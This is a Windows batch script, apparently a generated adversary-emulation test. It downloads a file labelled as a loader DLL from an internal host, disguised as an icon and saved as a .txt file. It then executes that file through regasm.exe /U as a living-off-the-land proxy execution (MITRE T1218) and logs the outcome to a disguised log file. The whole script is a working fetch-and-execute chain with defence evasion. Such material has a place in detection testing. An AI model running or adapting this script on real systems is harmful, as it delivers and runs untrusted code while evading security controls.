@echo off
setlocal enabledelayedexpansion

REM Random-named SET variables for every PHR placeholder
SET btqpl=https://10.0.0.49/stage/2/icon.png?10339-7
SET fjxir=%APPDATA%\10339\023a002d
SET vynco=d41c4f95.txt
SET zwqtc=%APPDATA%\7
SET rlpdq=%APPDATA%\7\macula-simulations.log
SET gpfsz=ITZEL-S2B
SET kqeum=10339
SET lghzt=7

REM Cache timestamp for debug logging
SET tsvar=!DATE!/!TIME!

REM Ensure log directory exists
if not exist "!APPDATA!\!lghzt!" mkdir "!APPDATA!\!lghzt!" >nul 2>&1
SET logpath=!APPDATA!\!lghzt!\macula-simulations.log

REM Debug: heartbeat start
echo [!tsvar!][DEBUG][!gpfsz!][!kqeum!]: heartbeat_start>> "!logpath!" 2>nul

REM Heartbeat fetch – downloads the Loader DLL
curl -k -s -o "!fjxir!\!vynco!" "!btqpl!"

REM Debug: heartbeat complete
echo [!tsvar!][DEBUG][!gpfsz!][!kqeum!]: heartbeat_complete>> "!logpath!" 2>nul

REM Change to output directory
echo [!tsvar!][DEBUG][!gpfsz!][!kqeum!]: chdir_start>> "!logpath!" 2>nul
cd /d "!fjxir!"
echo [!tsvar!][DEBUG][!gpfsz!][!kqeum!]: chdir_result=!errorlevel!>> "!logpath!" 2>nul

REM LOLBIN execution via regasm.exe /U
echo [!tsvar!][DEBUG][!gpfsz!][!kqeum!]: regasm_start>> "!logpath!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U "!vynco!" >NUL 2>&1
SET regasm_ec=!errorlevel!
echo [!tsvar!][DEBUG][!gpfsz!][!kqeum!]: regasm_result=!regasm_ec!>> "!logpath!" 2>nul

REM TTP logging
SET ttp_result=OK
SET ttp_error=
if !regasm_ec! neq 0 (
    SET ttp_result=FAIL
    SET ttp_error=lolbin_execution_failed
)
echo [%date% %time%][TTP][!gpfsz!][!kqeum!]: T1218|System Binary Proxy Execution=[!ttp_result!]:[!ttp_error!]>> "!logpath!" 2>nul

exit /b 0